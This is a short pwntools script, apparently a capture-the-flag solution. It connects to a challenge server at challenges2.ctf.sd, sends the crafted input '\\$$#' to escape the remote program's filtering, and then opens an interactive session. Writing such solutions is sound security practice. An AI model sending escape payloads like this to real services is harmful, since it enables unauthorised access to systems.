from pwn import *

r = remote("challenges2.ctf.sd", 34491)

payload = '\\$$#'
r.sendline(payload.encode())

r.interactive()